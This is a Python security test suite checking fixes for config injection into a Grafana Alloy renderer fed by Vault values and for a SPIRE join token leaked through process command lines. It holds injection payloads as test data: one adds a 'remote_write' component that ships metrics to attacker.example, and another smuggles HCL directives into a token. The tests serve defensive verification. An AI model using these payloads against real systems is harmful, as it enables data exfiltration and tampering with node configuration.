"""Security tests: VULN-023 and VULN-041 — untrusted values reaching config and argv.

VULN-023 (CWE-94): the vault-fetch init container writes three Vault-sourced values
straight into a River heredoc that Alloy then parses as configuration. River can
declare components, so a value carrying a quote or a newline does not merely break
the render — it adds directives, e.g. a second remote_write shipping this node's
metrics somewhere else.

VULN-041 (CWE-214): the SPIRE join token arrived as `JOIN_TOKEN_ARG=-joinToken <tok>`
in an EnvironmentFile, which systemd expanded into the agent's ExecStart. Process
command lines are world-readable on Linux, so any local process could read the token
out of /proc/<pid>/cmdline and attest as this node.

Both fixes are exercised by running the real fragments: the renderer against a
stubbed `vault`, and the token setter against a fixture agent.conf.
"""

import os
import re
import stat
import subprocess
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
ALLOY = REPO_ROOT / "aws" / "k8s" / "20-alloy.yaml"
CLOUD_INIT = REPO_ROOT / "cloud-init.yaml.tpl"
PROVISION = REPO_ROOT / "scripts" / "provision.sh"

ASSIGNMENT = re.compile(r"^\s*join_token\s*=", re.M)

AGENT_CONF_FIXTURE = """\
agent {
  data_dir          = "/opt/spire/agent/data"
  log_level         = "INFO"
  server_address    = "10.99.0.1"
  server_port       = "8081"
  trust_domain      = "viaduct.gcp"
  trust_bundle_path = "/opt/spire/agent/bootstrap.crt"
  socket_path       = "/run/spire-agent/public/api.sock"
}
plugins {
  NodeAttestor "join_token" { plugin_data {} }
  KeyManager "disk" { plugin_data { directory = "/opt/spire/agent/data" } }
  WorkloadAttestor "unix" { plugin_data {} }
}
"""


def render(body: str) -> str:
    return body.replace("$${", "${").replace("%%{", "%{")


def dedent(block: str) -> str:
    lines = block.splitlines()
    indent = min((len(l) - len(l.lstrip()) for l in lines if l.strip()), default=0)
    return "\n".join(l[indent:] for l in lines)


def write_file_content(path: str) -> str:
    """The rendered body of a cloud-init write_files entry."""
    body = render(CLOUD_INIT.read_text())
    entry = body.index(f"- path: {path}\n")
    marker = body.index("content: |\n", entry) + len("content: |\n")
    tail = body[marker:].splitlines()
    indent = len(tail[0]) - len(tail[0].lstrip())
    out = []
    for line in tail:
        if line.strip() and (len(line) - len(line.lstrip())) < indent:
            break
        out.append(line[indent:])
    return "\n".join(out).rstrip() + "\n"


# ── VULN-023 ─────────────────────────────────────────────────────────────────

class AlloyConfigRenderTest(unittest.TestCase):
    """Run the real renderer with `vault` stubbed to return chosen field values."""

    @staticmethod
    def fragment(out_dir: str) -> str:
        body = ALLOY.read_text()
        start = body.index("U=$(vault kv get -field=prometheus_user")
        end = body.index("\n          CFG\n", start) + len("\n          CFG\n")
        # The only rewrite: /rendered is a container mount that does not exist here.
        return dedent(body[start:end]).replace("/rendered", out_dir)

    def render_with(self, url: str, user: str, key: str):
        tmp = tempfile.mkdtemp()
        binp = Path(tmp) / "bin"
        binp.mkdir()
        out = Path(tmp) / "out"
        out.mkdir()

        fields = {"prometheus_url": url, "prometheus_user": user, "api_key": key,
                  # Loki push creds are fetched by the same renderer; the injection
                  # tests vary the prometheus_* fields, so keep these fixed-good.
                  "loki_url": "https://logs-prod-01.grafana.net/loki/api/v1/push",
                  "loki_user": "987654"}
        # Each value is written to a file and cat-ed back, so the stub delivers the
        # exact bytes. Interpolating a Python repr into the stub would turn an
        # embedded newline into a literal backslash-n and quietly stop exercising
        # the multi-line guard.
        for name, value in fields.items():
            (Path(tmp) / f"field_{name}").write_text(value)
        # `vault kv get -field=<name> kv/aws/grafana` — match the flag as a whole
        # word so prometheus_url and prometheus_user cannot alias each other.
        cases = "\n".join(
            f'  *"-field={name} "*) cat "{tmp}/field_{name}" ;;' for name in fields)
        (binp / "vault").write_text(
            "#!/usr/bin/env bash\ncase \"$*\" in\n" + cases + "\nesac\nexit 0\n")
        (binp / "vault").chmod(0o755)

        p = subprocess.run(
            ["bash", "-c", self.fragment(str(out))],
            capture_output=True, text=True, timeout=60, stdin=subprocess.DEVNULL,
            env=dict(os.environ, PATH=f"{binp}:{os.environ['PATH']}"))
        cfg = out / "config.alloy"
        p.config = cfg.read_text() if cfg.exists() else None
        return p

    GOOD = ("https://prometheus-prod-01.grafana.net/api/prom/push", "1234567", "glc_eyJvIjoiMTIzIn0=")

    def test_legitimate_credentials_render(self):
        """Anchor: without this every rejection below could be an unconditional abort."""
        p = self.render_with(*self.GOOD)
        self.assertEqual(p.returncode, 0, f"a legitimate secret was rejected: {p.stderr}")
        self.assertIsNotNone(p.config, f"no config was rendered: {p.stderr}")
        self.assertIn(f'url = "{self.GOOD[0]}"', p.config)
        self.assertIn(f'username = "{self.GOOD[1]}"', p.config)
        self.assertIn(f'password = "{self.GOOD[2]}"', p.config)

    def test_a_url_that_closes_the_string_cannot_add_a_component(self):
        payload = ('https://prometheus-prod-01.grafana.net/api/prom/push"\n    }\n  }\n}\n'
                   'prometheus.remote_write "exfil" {\n  endpoint {\n'
                   '    url = "https://attacker.example/push"\n  }\n}\n// ')
        p = self.render_with(payload, self.GOOD[1], self.GOOD[2])
        self.assertNotEqual(p.returncode, 0, "an injected remote_write was accepted")
        self.assertIsNone(
            p.config,
            f"config.alloy was written with injected directives:\n{p.config}")

    def test_a_username_carrying_a_quote_is_rejected(self):
        p = self.render_with(self.GOOD[0], '1234567" injected = "yes', self.GOOD[2])
        self.assertNotEqual(p.returncode, 0, "a quote in prometheus_user was accepted")
        self.assertIsNone(p.config, f"config.alloy was written:\n{p.config}")

    def test_an_api_key_carrying_a_newline_is_rejected(self):
        """A per-line regex would pass this; the multi-line guard is what stops it."""
        p = self.render_with(self.GOOD[0], self.GOOD[1], "glc_abc\nglc_def")
        self.assertNotEqual(p.returncode, 0, "a newline in api_key was accepted")
        self.assertIsNone(p.config, f"config.alloy was written:\n{p.config}")

    def test_an_empty_value_is_rejected(self):
        p = self.render_with(self.GOOD[0], "", self.GOOD[2])
        self.assertNotEqual(p.returncode, 0, "an empty prometheus_user was accepted")
        self.assertIsNone(p.config, f"config.alloy was written:\n{p.config}")

    def test_a_plain_http_endpoint_is_rejected(self):
        """Metrics carry node identity; the endpoint must stay TLS."""
        p = self.render_with("http://prometheus-prod-01.grafana.net/api/prom/push",
                             self.GOOD[1], self.GOOD[2])
        self.assertNotEqual(p.returncode, 0, "a plaintext remote_write URL was accepted")
        self.assertIsNone(p.config, f"config.alloy was written:\n{p.config}")


# ── VULN-041 ─────────────────────────────────────────────────────────────────

class JoinTokenSetterTest(unittest.TestCase):
    SETTER = "/usr/local/sbin/spire-agent-join-token"
    TOKEN = "3f2a1b6c-9d84-4e17-b0aa-5c7e2d31f908"

    def set_token(self, token: str, conf_body: str = AGENT_CONF_FIXTURE):
        tmp = Path(tempfile.mkdtemp())
        agent_dir = tmp / "opt" / "spire" / "agent"
        agent_dir.mkdir(parents=True)
        conf = agent_dir / "agent.conf"
        conf.write_text(conf_body)
        conf.chmod(0o644)

        script = tmp / "set-token"
        script.write_text(
            write_file_content(self.SETTER).replace("/opt/spire/agent", str(agent_dir)))
        script.chmod(0o755)

        p = subprocess.run([str(script)], input=token + "\n", capture_output=True,
                           text=True, timeout=30)
        p.conf = conf.read_text()
        p.mode = stat.S_IMODE(conf.stat().st_mode)
        p.dir = agent_dir
        return p

    def test_a_valid_token_lands_in_the_config(self):
        """Anchor: the agent still has to receive the token to attest at all."""
        p = self.set_token(self.TOKEN)
        self.assertEqual(p.returncode, 0, f"a valid token was rejected: {p.stderr}")
        self.assertIn(f'join_token        = "{self.TOKEN}"', p.conf,
                      f"the token is not in agent.conf:\n{p.conf}")

    def test_the_token_lands_inside_the_agent_block(self):
        """Outside `agent { }` SPIRE ignores it and the node silently fails to attest."""
        p = self.set_token(self.TOKEN)
        agent_block = p.conf[p.conf.index("agent {"): p.conf.index("\n}")]
        self.assertRegex(agent_block, ASSIGNMENT,
                      f"join_token was placed outside the agent block:\n{p.conf}")

    def test_the_config_is_not_world_readable(self):
        p = self.set_token(self.TOKEN)
        self.assertEqual(
            p.mode & 0o077, 0,
            f"agent.conf is {oct(p.mode)}; it now carries the join token, so any "
            f"local account could read it — the exact exposure this fix removes")

    def test_reprovisioning_replaces_rather_than_appends(self):
        first = self.set_token(self.TOKEN)
        second = self.set_token("aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee", conf_body=first.conf)
        self.assertEqual(
            len(ASSIGNMENT.findall(second.conf)), 1,
            f"a stale token from a previous provision is still valid:\n{second.conf}")
        self.assertNotIn(self.TOKEN, second.conf, "the previous token was left behind")

    def test_a_token_carrying_hcl_syntax_is_rejected(self):
        payload = '3f2a1b6c"\n  data_dir = "/tmp/pwned'
        p = self.set_token(payload)
        self.assertNotEqual(p.returncode, 0, "a token carrying HCL syntax was accepted")
        self.assertNotIn("pwned", p.conf, f"agent.conf was rewritten:\n{p.conf}")

    def test_an_empty_token_is_rejected(self):
        p = self.set_token("")
        self.assertNotEqual(p.returncode, 0, "an empty token was accepted")
        self.assertEqual(ASSIGNMENT.findall(p.conf), [],
                         f"agent.conf was rewritten:\n{p.conf}")

    def test_the_legacy_env_file_is_removed(self):
        """A node provisioned before this change keeps a 0600 file holding the token."""
        p = self.set_token(self.TOKEN)
        self.assertFalse((p.dir / "join.env").exists())
        self.assertIn("rm -f", write_file_content(self.SETTER),
                      "the stale join.env from the argv scheme is never cleaned up")


class JoinTokenNotInArgvTest(unittest.TestCase):
    @staticmethod
    def unit_body() -> str:
        """The systemd unit's heredoc body.

        Slicing at the first "AGENT_UNIT" lands on the heredoc *opener*, which sits
        on the `cat >` line — the body would then be empty and every assertion over
        it vacuous. Step past that line first, then cut at the terminator.
        """
        body = render(CLOUD_INIT.read_text())
        opener = body.index("cat > /etc/systemd/system/spire-agent.service")
        start = body.index("\n", opener) + 1
        return body[start: body.index("AGENT_UNIT", start)]

    def test_the_extracted_unit_is_the_real_one(self):
        """Anchor: the two assertions below are only meaningful over a real body."""
        unit = self.unit_body()
        self.assertIn("[Service]", unit, f"the extracted unit body is not a unit:\n{unit!r}")
        self.assertIn("ExecStart=", unit, f"the extracted unit body has no ExecStart:\n{unit!r}")

    def test_the_unit_does_not_expand_a_token_into_execstart(self):
        unit = self.unit_body()
        self.assertNotIn("JOIN_TOKEN_ARG", unit,
                         f"the token is still expanded into the command line:\n{unit}")
        self.assertNotIn("join.env", unit,
                         f"the unit still sources the token env file:\n{unit}")

    def test_the_execstart_is_still_present(self):
        """Anchor: the negative assertions above would pass on a deleted unit."""
        body = render(CLOUD_INIT.read_text())
        self.assertRegex(
            body, r"ExecStart=/usr/local/bin/spire-agent run -config /opt/spire/agent/agent\.conf\s*\n",
            "the agent ExecStart is missing or still carries arguments")

    def test_the_provisioner_does_not_send_the_token_as_an_argument(self):
        body = "\n".join(l for l in PROVISION.read_text().splitlines()
                         if not l.lstrip().startswith("#"))
        self.assertNotIn("-joinToken", body,
                         "the provisioner still builds a -joinToken argument")
        self.assertIn('printf \'%s\\n\' "$TOKEN" | $SSH', body,
                      "the token is no longer piped over stdin to the setter")


if __name__ == "__main__":
    unittest.main()
